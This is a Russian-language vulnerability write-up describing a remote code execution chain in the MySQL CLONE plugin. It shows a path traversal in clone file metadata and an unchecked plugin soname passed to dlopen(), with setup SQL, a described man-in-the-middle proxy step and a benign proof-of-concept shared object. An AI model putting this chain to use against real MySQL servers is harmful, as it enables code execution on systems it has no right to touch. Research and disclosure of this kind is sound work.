> RCE в MySQL CLONE plugin

Устройство CLONE

CLONE INSTANCE FROM 'user'@'host':port
IDENTIFIED BY 'password'
[DATA DIRECTORY [=] 'clone_dir']
[REQUIRE [NO] SSL];

Надобность у него такова: быстро добавить новый узел в кластер, новую реплику, создать копию. Очень полезный и нужный инструмент в арсенале DBA. Побудем немножко DBA.

Сразу определимся с терминологией:

- Donor - хост с которого сливается CLONE БД

- Recipient – хост на котором вызывается команда CLONE

Схема

Вот по этому сюжету будем двигаться

Настройки

Чтобы было легче принимать на recipient и donor выставляем:

SET GLOBAL innodb_checksum_algorithm = 'none';
SET GLOBAL clone_enable_compression = OFF;
SET GLOBAL clone_autotune_concurrency = OFF;
SET GLOBAL clone_max_concurrency = 1;
SET GLOBAL clone_max_data_bandwidth = 1;
SET GLOBAL clone_max_network_bandwidth = 1;
Настройка Эффект Зачем
innodb_checksum_algorithm вместо вычисляемой чексуммы записывает постоянное значение уменьшает влияние чексуммы на эксперименты с изменением передаваемого потока
clone_enable_compression отключает сжатие данных прокся видит исходный clone stream и может разбирать его без дополнительного этапа работы со сжатием
clone_autotune_concurrency отключает автоматическое изменение числа тредов в зависимости от пропускной способности автотюн тут не нужен
clone_max_concurrency ограничивает одним тредом делает порядок метадаты более предсказуемым
clone_max_data_bandwidth ограничивает скорость передачи замедляет передачу файлов, упрощая работу с пакетам, буферизацию и сопоставление метадаты с соответствующим файловым потоком
clone_max_network_bandwidth ограничивает сетевую скорость даёт проксе больше времени на разбор и модификацию пакетов

Path traversal

IBD

Во время операции CLONE под капотом recipient происходит копирование того что прилетело в метадате со сверкой длины и \0, вторым шагом происходит конкатенация в Clone_Snapshot::build_file_path()

Дальше apply_file_metadata() создаёт из дескриптора файловый контекст и инициирует создание файла. Clone_Handle::open_file() забирает построенное имя и передаёт его в os_file_create() с OS_FILE_CREATE_PATH. Если директорий нет, они будут любезно созданы в os_file_create_subdirs_if_needed()

Source to sink:

Получается source-to-sink:

  • CLONE_DESC_FILE_METADATA.m_file_name
  • → deserialize()
  • → build_file_path(data_dir, file_meta)
  • → Clone_file_ctx
  • → open_file()
  • → os_file_create(..., OS_FILE_CREATE_PATH, ...)

Итак первая любопытная находка, что clone_dir никак не связан с secure_file_priv, но обязательно должна либо не существовать, либо быть пустой. Так что вариант с дописыванием в какой-то /home отпадает. Ок! Это становится первым примитивом – произвольная запись куда может процесс mysql.

SONAME

Вторая находка, что если на donor есть какой-то плагин, он передаётся в COM_RES_PLUGIN_V2 в такой структуре:

u8    response_command
u32le key_length
u8[]  key
u32le value_length
u8[]  value

key – имя плагина, value — его soname

В Client::handle_response() на recipient снимает command byte и передаёт в add_plugin_with_so().

extract_string() и extract_key_value() корректно контролируют границы и читают обе u32le длины, после чего пара попадает в m_plugins_with_so.

Пока всё выглядит хорошо, всё memory safe.

Дальше validate_remote_params() перебирает donor плагины. Если плагин уже установлен на recipient, ветка заканчивается. Если нет, soname передаётся в plugin_is_loadable().

А plugin_is_loadable() делает буквально следующее:

bool Client::plugin_is_loadable(std::string &so_name) {
  Key_Values configs = { {"plugin_dir", ""} };
  auto err =
      mysql_service_clone_protocol->mysql_clone_get_configs(get_thd(), configs);

  if (err != 0) {
    return false;
  }

  std::string path(configs[0].second);
  path.append("/");
  path.append(so_name);

  return clone_os_test_load(path);
}

clone_os_test_load() вызывает:

bool clone_os_test_load(std::string &path) {
  char dlpath[FN_REFLEN];

  unpack_filename(dlpath, path.c_str());
  auto handle = dlopen(dlpath, RTLD_NOW);

  if (handle == nullptr) {
    return false;
  }

  dlclose(handle);
  return true;
}

Вот это второй любопытный момент, то есть само тело плагина не передаётся, а передаётся его имя (soname) и локально уже ищется и подгружается. Это становится вторым примитивом – dlopen() по любому пути

В результате имеем два флоу:

  • Через path traversal и подмену ibd льём свой ELF, остатки добиваем \0
  • Через повторный path traversal, но уже в имени заранее несуществующего плагина выполняем dlopen()

Почему бы сразу не воспользоваться штатным plugin loader? Да потому что там всё хорошо с проверкой границ:

/**
   Check if the provided path is valid in the sense that it does cause
   a relative reference outside the directory.

   @note Currently, this function only check if there are any
   characters in FN_DIRSEP in the string, but it might change in the
   future.

   @code
   check_valid_path("../foo.so") -> true
   check_valid_path("foo.so") -> false
   @endcode
 */
bool check_valid_path(const char *path, size_t len) {
  size_t prefix = my_strcspn(files_charset_info, path, path + len, FN_DIRSEP,
                             strlen(FN_DIRSEP));
  return prefix < len;
}

Test

На recipient

INSTALL PLUGIN clone SONAME 'mysql_clone.so';
SET GLOBAL clone_valid_donor_list = 'donor:3309';
CREATE USER 'ca'@'%' IDENTIFIED BY 'p';
GRANT CLONE_ADMIN ON *.* TO 'ca'@'%';
GRANT BACKUP_ADMIN ON *.* TO 'ca'@'%';

На donor

CREATE USER 'clone_user'@'%' IDENTIFIED BY 'clone_pass';
GRANT BACKUP_ADMIN ON *.* TO 'clone_user'@'%';
INSTALL PLUGIN auth_socket SONAME 'auth_socket.so'; -- плагин который не установлен на recipient
CREATE TABLE ZZZZZZZZZZZZZZZZZZZZZZ (data LONGBLOB) ENGINE=InnoDB;

Запускаем MITM proxy.py перед donor на порту 3309

На recipient

CLONE INSTANCE FROM 'clone_user'@'${PROXY_IP}':3309 IDENTIFIED BY 'clone_pass' DATA DIRECTORY = '/tmp/clone1' REQUIRE NO SSL;

В первый проход проиходит патчинг ibd (6) со схемы

Запускаем эту же команду снова, но с другим каталогом, например /tmp/clone2

В этот раз proxy переходит в режим патчинга COM_RES_PLUGIN_V2 (12), и на recipient выполняется dlopen() -> constructor -> RCE

Пример тестового ELF:

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

__attribute__((constructor))
static void pwn(void) {
    FILE *f = fopen("/tmp/clone_pwned", "w");
    if (!f) return;
    fprintf(f, "=== CLONE PATH TRAVERSAL RCE ===\n");
    fprintf(f, "PID:  %d\nUID:  %d\nEUID: %d\n", getpid(), getuid(), geteuid());
    fclose(f);
}
